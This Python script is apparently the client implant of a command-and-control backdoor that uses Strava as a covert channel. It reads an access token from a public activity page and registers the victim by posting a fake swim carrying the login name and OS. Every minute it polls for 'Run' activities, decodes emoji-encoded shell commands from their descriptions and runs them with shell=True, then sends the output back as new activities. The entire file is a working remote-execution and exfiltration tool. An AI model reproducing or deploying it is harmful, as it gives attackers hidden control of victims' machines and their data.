import subprocess
import platform
import os
import time
import json
import re
from datetime import datetime, timedelta
from contextlib import suppress
from pathlib import Path

import requests
from dotenv import dotenv_values

from tools import emoji_encode, emoji_decode

config = dotenv_values(Path(__file__).parent/".env") 

MAIN_ACTIVITY = config.get("MAIN_ACTIVITY","")
ACCESS_TOKEN = ""
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
HEADERS = {
    'User-Agent': USER_AGENT,
    'Authorization': f"Bearer {ACCESS_TOKEN}",
    'Content-Type': 'application/json',
}

def recover_token(activity_id: int) -> str:
    response = requests.get(f"https://www.strava.com/activities/{activity_id}", headers=HEADERS)
    if match := re.search(r'property="og:description" content="([a-f0-9]{40})',str(response.content)):
        return match.group(1)
    else:
        return "" 


def get_activity(activity_id: int) -> requests.Response:
    response = requests.get(f"https://www.strava.com/api/v3/activities/{activity_id}", headers=HEADERS)
    return response


def get_activities()-> requests.Response:
    response = requests.get(f"https://www.strava.com/api/v3/activities", headers=HEADERS)
    return response

def post_initial_activity():
    description = json.dumps({"os":platform.system()})
    json_data = {
        'commute': 0,
        'description': emoji_encode("🏊", description),
        'distance': '600',
        'elapsed_time': '1200',
        'name': f"{os.getlogin()}",
        'sport_type': 'Swim',
        'start_date_local': (datetime.now() - timedelta(minutes=20)).isoformat(),
        'trainer': 0,
        'type': 'Swim',
    }
    response = requests.post('https://www.strava.com/api/v3/activities', headers=HEADERS, json=json_data)
    return response

def post_activity(description: str, parent_act_id: int):
    json_data = {
        'commute': 0,
        'description': emoji_encode("🏊", description),
        'distance': '600',
        'elapsed_time': '1200',
        'name': f"{os.getlogin()}-{parent_act_id}",
        'sport_type': 'Swim',
        'start_date_local': (datetime.now() - timedelta(minutes=20)).isoformat(),
        'trainer': 0,
        'type': 'Swim',
    }

    response = requests.post('https://www.strava.com/api/v3/activities', headers=HEADERS, json=json_data)
    return response


if __name__ == "__main__":
    while True:
        try:
            ACCESS_TOKEN = recover_token(MAIN_ACTIVITY)
            HEADERS = {
            'User-Agent': USER_AGENT,
            'Authorization': f"Bearer {ACCESS_TOKEN}",
            'Content-Type': 'application/json',
            }
            activities = get_activities().json()
            responded_activities = []
            already_notified = False
            if isinstance(activities, list):
                for _activity in activities:
                    if (act_title := _activity.get("name","")):
                        if act_id := re.search(r"-(?P<act_id>\d+)",act_title):
                            responded_activities.append(act_id.group('act_id'))
                        if act_title == os.getlogin():
                            already_notified = True
                if not already_notified:
                    post_initial_activity()
                for _activity in activities:

                    if (act_id := _activity.get("id",0)) and str(act_id) not in responded_activities and act_id != MAIN_ACTIVITY:
                        activity = get_activity(act_id).json()
                        if activity.get("type") == "Run" and activity.get("name","").startswith(os.getlogin()):
                            with suppress(subprocess.CalledProcessError):
                                command = emoji_decode(activity.get("description",""))[1:]
                                a = subprocess.run(command, shell=True, check=True, capture_output=True, encoding='utf-8')
                                b = post_activity(a.stdout, act_id)
        except Exception as e:
            print(e)
        time.sleep(60)
